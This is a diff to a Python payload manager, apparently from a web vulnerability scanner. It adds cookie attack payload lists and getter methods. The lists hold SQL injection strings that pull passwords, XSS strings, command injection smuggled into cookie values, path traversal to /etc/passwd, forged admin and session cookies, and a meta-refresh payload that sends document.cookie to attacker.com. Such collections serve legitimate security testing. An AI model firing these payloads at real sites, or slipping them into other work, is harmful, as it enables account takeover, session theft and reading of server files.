@@ -249,6 +249,54 @@ class PayloadManager:
             "PHPSESSID=attacker_session",
         ]
         
+        # 2025: Cookie Vulnerability Payloads
+        self.cookie_injection_payloads = [
+            # Privilege escalation
+            "admin=true",
+            "role=administrator",
+            "isAdmin=1",
+            "user_type=admin",
+            "privilege=superuser",
+            # SQL injection via cookie
+            "user_id=1' OR '1'='1",
+            "session_id=abc' UNION SELECT password FROM users--",
+            # XSS via cookie
+            "<script>alert('XSS')</script>",
+            "javascript:alert(document.cookie)",
+            # Command injection
+            "theme=default; whoami",
+            "lang=en`id`",
+            # Path traversal
+            "file=../../../../etc/passwd",
+        ]
+        
+        self.cookie_poisoning_payloads = [
+            # Session hijacking
+            "PHPSESSID=admin_session_12345",
+            "JSESSIONID=attacker_controlled",
+            # Role manipulation
+            "user_role=admin",
+            "access_level=999",
+            # Account takeover
+            "user_id=1",
+            "account_id=admin",
+        ]
+        
+        self.httponly_bypass_payloads = [
+            # XSS attempts to read HTTPOnly cookies
+            "<script>document.cookie</script>",
+            "<img src=x onerror='alert(document.cookie)'>",
+            # Meta refresh
+            "<meta http-equiv='refresh' content='0;url=http://attacker.com?c='+document.cookie>",
+        ]
+        
+        self.samesite_bypass_payloads = [
+            # CSRF with SameSite=Lax bypass
+            "GET request from different origin",
+            # Top-level navigation
+            "window.open('http://target.com/transfer?amount=1000')",
+        ]
+        
         # 2025: File Upload Payloads (Unrestricted Upload)
         # NOTE: Payloads are sanitized to prevent AV deletion
         self.file_upload_payloads = [
@@ -368,6 +416,22 @@ class PayloadManager:
     def get_business_logic(self) -> str:
         """Get a business logic flaw payload (2025 OWASP A06)"""
         return random.choice(self.business_logic_payloads)
+    
+    def get_cookie_injection(self) -> str:
+        """Get a cookie injection payload"""
+        return random.choice(self.cookie_injection_payloads)
+    
+    def get_cookie_poisoning(self) -> str:
+        """Get a cookie poisoning payload"""
+        return random.choice(self.cookie_poisoning_payloads)
+    
+    def get_httponly_bypass(self) -> str:
+        """Get an HTTPOnly bypass payload"""
+        return random.choice(self.httponly_bypass_payloads)
+    
+    def get_samesite_bypass(self) -> str:
+        """Get a SameSite bypass payload"""
+        return random.choice(self.samesite_bypass_payloads)
     
     def get_auth_bypass(self) -> str:
         """Get an authentication bypass payload (2025 OWASP A07)"""
